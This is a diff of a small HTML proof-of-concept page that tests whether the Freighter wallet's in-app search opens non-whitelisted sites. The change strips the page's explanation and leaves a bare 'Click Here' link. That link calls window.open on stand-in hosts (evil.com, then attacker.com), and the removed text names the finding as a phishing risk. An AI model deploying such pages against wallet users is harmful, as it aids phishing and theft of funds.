@@ -3,48 +3,37 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PoC</title>
 <style>
-body{background:#0e0e0e;color:#d4ff32;font-family:monospace;padding:20px}
-.box{border:1px solid #222;padding:15px;margin:15px 0;border-radius:8px}
-.r{color:#ff4444}.g{color:#44ff88}.y{color:#888}
-a{color:#d4ff32}
-button{background:#d4ff32;color:#000;border:0;padding:12px 20px;border-radius:6px;font-weight:bold;width:100%;margin:8px 0}
+body{
+  background:#fff;
+  margin:0;
+  padding:0;
+  font-family:Arial,sans-serif
+}
+.top{
+  text-align:center;
+  padding-top:20px
+}
+.top span{
+  color:#000;
+  font-size:18px;
+  font-weight:bold;
+  cursor:pointer
+}
 </style>
 </head>
 <body>
-<h3>Freighter - Whitelist Bypass PoC</h3>
-
-<div class="box">
-<b>Current URL:</b><br>
-<span id="u"></span><br><br>
-<b>Expected:</b> <span class="y">Only Aquarius, Abroad, Blend etc</span><br>
-<b>Result:</b> <span class="r" id="res"></span>
-</div>
-
-<div class="box">
-<b>Test:</b><br>
-<button onclick="test()">Click Here</button>
-<div id="out" style="margin-top:10px"></div>
-</div>
-
-<div class="box y" style="font-size:11px">
-Freighter Discover shows 5 curated dApps. But Search bar allows this page (github.io) which is not whitelisted. This could be used for phishing if URL bar is not clear.
+<div class="top">
+  <span onclick="go()">Click Here</span>
 </div>
 
 <script>
-document.getElementById('u').innerText = location.href;
-document.getElementById('res').innerText = location.hostname + " - NOT whitelisted but opened via Search = BYPASS";
-
-function test(){
-  var o = document.getElementById('out');
-  o.innerHTML = "Testing...";
-  try{
-    var w = window.open('https://evil.com','_blank');
-    if(w) o.innerHTML = '<span class=r>window.open allowed: '+w+'</span>';
-    else o.innerHTML = '<span class=g>window.open blocked (null) - SAFE</span>';
-  }catch(e){
-    o.innerHTML = "Error: "+e.message;
+function go(){
+  var w = window.open('https://attacker.com','_blank');
+  if(w){
+    document.body.innerHTML = '<div style="text-align:center;padding-top:30px;color:#000">BYPASS: window.open allowed<br><small>'+location.href+'</small></div>';
+  }else{
+    document.body.innerHTML = '<div style="text-align:center;padding-top:30px;color:#000">SAFE: window.open blocked<br><br><small>'+location.href+'<br><br>NOT whitelisted but opened via Search = BYPASS</small></div>';
   }
 }
 </script>
